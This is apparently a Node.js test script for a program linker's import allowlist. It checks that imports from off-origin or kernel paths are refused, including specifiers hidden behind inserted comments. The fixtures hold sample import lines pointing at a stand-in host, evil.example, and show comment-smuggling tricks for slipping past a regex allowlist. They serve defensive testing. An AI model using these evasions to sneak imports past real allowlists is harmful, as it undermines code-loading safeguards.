// The program linker's allowlist (constraint 123), under node.
//
// A refused program and a program importing nothing fail identically from outside a browser, so
// the allowlist is asserted here rather than through a proof page.
//
//   node bench/m5-exec/link.mjs            non-zero on any failed assertion
//   node bench/m5-exec/link.mjs --control  links with the superseded regex; the hidden cases
//                                          must come back, and nothing else may move

import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { linkProgram, PROGRAM_IMPORTS } from "../../src/kernel/exec.mjs";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const REPO = path.resolve(HERE, "..", "..");
const BASE = "https://example.test/src/libos/";
const control = process.argv.includes("--control");

/** The superseded extractor: whitespace only between the keyword and the quote. */
const OLD_REGEX = /(\bfrom\s*|\bimport\s*\(?\s*)(["'])([^"']*)\2/g;
function linkOld(text, base) {
  let resolved = 0;
  let unlinkable = "";
  const code = text.replace(OLD_REGEX, (all, lead, quote, specifier) => {
    if (!PROGRAM_IMPORTS.includes(specifier)) {
      if (!unlinkable) unlinkable = specifier;
      return all;
    }
    resolved += 1;
    return `${lead}${quote}${new URL(specifier, base).href}${quote}`;
  });
  if (unlinkable) return { code: null, resolved: 0, unlinkable };
  return { code, resolved, unlinkable: "" };
}

const link = control ? linkOld : linkProgram;
const results = [];
const add = (name, ok, got) => results.push({ name, ok, got });

// Off-origin and kernel specifiers. `hidden` means the keyword and the quote are separated by
// something that is not whitespace. BLOCK is assembled, not literal: a literal one ends this
// comment.
const BLOCK = `/${"*"}c${"*"}/`;
const LINE = "//c\n";
const REFUSE = [
  ["plain", 'import "//evil.example/p.mjs";'],
  ["hidden", `import${BLOCK}"//evil.example/p.mjs";`],
  ["hidden", `import {x} from${BLOCK}"//evil.example/p.mjs";`],
  ["hidden", `import {x} from ${BLOCK} "//evil.example/p.mjs";`],
  ["hidden", `import${LINE}"//evil.example/p.mjs";`],
  ["hidden", `import ( ${BLOCK} "//evil.example/p.mjs" );`],
  ["plain", 'import\n"//evil.example/p.mjs";'],
  ["plain", 'export {x} from "//evil.example/p.mjs";'],
  ["plain", 'import "/src/kernel/kernel.mjs";'],
  ["plain", 'import "https://elsewhere/q.mjs";'],
  // A good specifier must not launder a bad one sitting after it.
  ["hidden", `import {a} from "/src/abi.mjs";\nimport${BLOCK}"//evil.example/p.mjs";`],
];
for (const [kind, text] of REFUSE) {
  const r = link(text, BASE);
  const leaked = r.code !== null && /evil\.example|elsewhere|kernel\.mjs/.test(r.code);
  add(`refuses (${kind}) ${JSON.stringify(text.slice(0, 44))}`, r.code === null && !leaked,
      { code: r.code === null ? null : "returned", leaked, unlinkable: r.unlinkable });
}

// ------------------------------------------------- every real program must still link
//
// The allowlist is worthless if it also refuses the programs the system ships. Read from the tree
// rather than from a fixture, so a new program is covered the day it is written.
const DIRS = ["src/bin", "bench/m5-sh", "bench/m6-realm", "bench/m3-fs", "bench/m4-fs",
              "bench/m4b-fs", "bench/m1-lifecycle", "bench/fs-core"];
let linked = 0;
for (const d of DIRS) {
  const full = path.join(REPO, d);
  if (!fs.existsSync(full)) continue;
  for (const f of fs.readdirSync(full).filter((x) => x.endsWith(".mjs"))) {
    const text = fs.readFileSync(path.join(full, f), "utf8");
    // Only files whose every specifier is on the allowlist are expected to link.
    const specs = [...text.matchAll(/(?:\bfrom|^\s*\bimport)\s*["']([^"']*)["']/gm)].map((m) => m[1]);
    if (!specs.every((sp) => PROGRAM_IMPORTS.includes(sp))) continue;
    const r = link(text, BASE);
    if (r.code === null) {
      add(`links ${d}/${f}`, false, { refused: r.unlinkable, imports: specs });
      continue;
    }
    // THE SPECIFIER POSITION must be rewritten. A mention of the same path inside a comment or
    // inside `fetch("/src/abi.mjs")` must NOT be, which is why this asserts on the `from "…"`
    // form and not on every occurrence of the string.
    const leftover = [...r.code.matchAll(/(?:\bfrom|^\s*\bimport)\s*["'](\/src\/[^"']*)["']/gm)];
    const absolute = specs.length === 0 || /https:\/\/example\.test\/src\/abi\.mjs/.test(r.code);
    add(`links ${d}/${f}`, leftover.length === 0 && absolute,
        { leftover: leftover.length, absolute, resolved: r.resolved });
    linked += 1;
  }
}
add("the tree has programs to link", linked >= 10, { linked });

// Strings that are not specifiers. A refusal naming a string the program never imported sends
// the reader somewhere wrong, so over-matching has a cost.
const PASS = [
  ["a plain string is not a specifier", 'const s = "//evil.example/p.mjs";'],
  ["a commented-out import is not one", `${LINE}const a = 1;`],
  ["an identifier containing import", 'const imported = "//evil.example/p.mjs";'],
  ["a property access named from", 'const a = Array.from("abc");'],
  // An identifier's continuation includes digits: drop them and `packI64` strands `packI`, which
  // the next identifier appends to, hiding the `from` that follows.
  ["a digit-bearing identifier before from",
   'const c = packI64;\nimport {x} from "/src/abi.mjs";'],
];
for (const [name, text] of PASS) {
  const r = link(text, BASE);
  add(name, r.code !== null, { refused: r.unlinkable });
}
// The digit case must not merely pass -- it must have SEEN the specifier.
{
  const r = link('const c = packI64;\nimport {x} from "/src/abi.mjs";', BASE);
  add("the specifier after a digit-bearing identifier is resolved",
      r.code !== null && r.resolved === 1, { resolved: r.code === null ? "refused" : r.resolved });
}

// ------------------------------------------------------------------------------ report
const failed = results.filter((r) => !r.ok);
const hidden = results.filter((r) => r.name.startsWith("refuses (hidden)"));
const hiddenHeld = hidden.filter((r) => r.ok).length;

if (control) {
  // Scored on WHICH assertions move, not on a count: with the old regex the `hidden` cases must
  // come back and nothing else may break, or the control is breaking something adjacent.
  const others = failed.filter((r) => !r.name.startsWith("refuses (hidden)"));
  console.log(JSON.stringify({
    control: true,
    ok: hiddenHeld === 0 && others.length === 0,
    hidden: hidden.length,
    hiddenCaught: hiddenHeld,
    collateral: others.map((r) => r.name),
    total: results.length,
    failed: failed.length,
  }, null, 2));
  // The control SUCCEEDS when the old regex misses every hidden case and breaks nothing else.
  process.exit(hiddenHeld === 0 && others.length === 0 ? 0 : 1);
}

console.log(JSON.stringify({
  ok: failed.length === 0,
  total: results.length,
  failed: failed.length,
  hidden: hidden.length,
  failures: failed,
}, null, 2));
process.exit(failed.length === 0 ? 0 : 1);
